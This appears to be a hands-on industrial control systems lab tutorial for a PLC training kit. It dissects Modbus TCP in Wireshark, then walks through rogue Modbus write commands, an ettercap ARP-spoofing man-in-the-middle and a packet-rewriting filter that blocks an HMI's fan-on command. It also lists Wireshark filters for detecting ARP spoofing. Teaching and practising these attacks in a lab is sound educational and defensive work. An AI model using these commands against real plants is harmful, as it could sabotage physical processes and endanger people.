# Introduction

You have your kit all wired, Programmed, and connected to your Ignition Gateway!

You have a remote Human Machine Interface (HMI) to control your process AND you're collecting your process data in a *Historian Database*!

You have a working OT **Network**!

*Great job!*

NOW it's time to *look under the hood*.

Today we will explore the ModbusTCP protocol by examining the packets flying between the PLC and the HMI.

- Learn the inner guts of Modbus TCP communications, including:
    - Modbus Transaction IDs
    - Function Codes (Reading and writing to the PLC)
    - TCP Packet inspection
    - Modbus Addressing
    - Modbus Requests and Responses
    - Coils, Discrete Inputs, and Registers, oh my!

- Send Rogue commands with `modbus-cli` from our Kali machine.

- Initiatee an ***arp spoof attack!*** (this will place our Kali machine in the  middle of the PLC-to-HMI network connection).

# Exploring ModbusTCP

## Starting Wireshark

1. Open wireshark on the Ignition Gateway.
```
sudo wireshark
```
2. Select the network interface connected to the PLC.
3. Start your capture.

## The Modbus Packet

1. Transaction Identifier - ties request to response.
2. Protocol ID - Always 0.
3. Length - Length (duh)
4. Function Codes:
    - **1** - Read Coils
    - **2** - Read Discrete Input
    - **3** - Read Holding Registers
    - **4** - Read Input Registers
    - **5** - Write Single Coil
    - **6** - Write Single Register
    - **15** - Write Multiple Coils
    - **16** - Write Multiple Registers

**Request (HMI to PLC)**
5. Reference Number - Modbus Address to start.
6. Bit Count - How many bits to read after Reference Number.

**Response (PLC to HMI)**
5. Byte Count - How many bytes to expect.
6. Bit 1, Bit 2, Bit 3, ...

## Modbus terminology

- **Coil** - Digital output (PLC turns something on or off, like our fan or light!)
- **Discrete Input** - Digital Input (Like the start or stop buttons).
- **Holding Register** - Analog output (like a dimmable light or fan speed).
- **Input Register** - Analog Input (like temperature, pressure, speed, or distance sensor).

# Sending Rogue Commands

Below is an adapted version of [Pascal Ackerman](https://www.linkedin.com/in/pascal-ackerman-036a867b/)'s article on [Attacking Modbus](https://www.linkedin.com/pulse/attacking-modbus-pascal-ackerman-z1vnc/?trackingId=PVEdWf%2BbRRK6e4J0vdGryQ%3D%3D).

As you can see in the packets, everything is clear text, with no authentication.

Any commands sent to the PLC will be executed. 😱

### Installing modbus-cli

In your Kali machine, install Modbus-cli
```
sudo gem install modbus-cli
```
### Sending Rogue Commands
```
modbus write 192.168.0.10 %M8192 1
```
Did your fan start?? It should have.

Try
```
modbus read 192.168.0.10 %M8192 8
modbus read 192.168.0.10 %M0 8
modbus write 192.168.0.10 %M1 1
modbus write 192.168.0.10 %M0 0
```

# ARP Spoofing!

Again, since there is no encryption or atribution, we can insert ourselves in the middle of the network conversation between the PLC and the HMI.

This way, we can monitor and/or manipulate modbus values!

For more details, see SANS Technical Institute Gabriel Sanchez's research paper - [Man-In-The-Middle Attack Against Modbus TCP Illustrated with Wireshark](https://www.giac.org/paper/gccc/817/man-in-the-middle-attack-modbus-tcp-illustrated-wireshark/116887)

TLDR: ARP Spoofing convinces the PLC that your Kali machine is the HMI.
While also convincing the HMI that your Kali machine is the PLC.

O.M.G.!

This forces all traffic to flow through our attack machine.

Ettercap should be installed on your Kali machine already.

Try:
```
sudo ettercap -T -i eth0 -M arp:remote /192.168.0.3// /192.168.0.10//
```

Now examine your packet captures! Do you notice something strange going on with the MAC addresses?

Here are useful Wireshark filters to detect ARP Spoofing:

- Show All ARP Traffic: `arp` (Focus on finding anomalies, such as many replies without requests).
- Find Duplicate IP Addresses: `arp.duplicate-address-detected` or `arp.duplicate-address-frame`. This indicates two different machines claiming the same IP.
- Detect Gratuitous ARP (Suspicious): `arp.isgratuitous`. Attackers send these to poison ARP caches without an official request.
- Filter ARP Responses: `arp.opcode == 2`. 
- Review these to see if a single MAC address is mapping to multiple IPs (like the gateway IP and yours).

## Manipulating Values on-the-fly!

OK, let's make it a little more interesting.

Since we're in the middle, we can alter an HMI request to turn the fan on, changing the command to instead turn the fan off (keep it off forever).

In short, HMI -> PLC command to turn fan ~~ON~~ (changed to) **OFF**.

1. Create a file called `etter.filter.modbus` with the following content:
```
if (ip.proto == TCP && tcp.dst == 502) {
  if (DATA.data + 7 =="\x05") {
    if (DATA.data + 8 =="\x20\x00") {
      if (search(DATA.data, "\xff\x00")) {
         msg("Found modbus on switch of ff 00!!");
         exec("/bin/sh -c /home/oren/test.sh");
         replace("\xff\x00", "\x00\x00");
      }
    }
  }
}
```

2. Compile this into an ettercap filter!
```
etterfilter etter.filter.modbus -o modbus.ef
```

3. Run the command with the filter!
```
sudo ettercap -T -F modbus.ef -i eth0 -M arp:remote /192.168.0.3// /192.168.0.10//
```

What happens when you try to start the fan? Does it let you??

# Conclusion

Hope you had fun.

Next section will be on a more sophisticated attack, where the values are altered, but the original (intended) values are still fed back to the operator!

**Manipulation + Deception, Oceans 11 style!**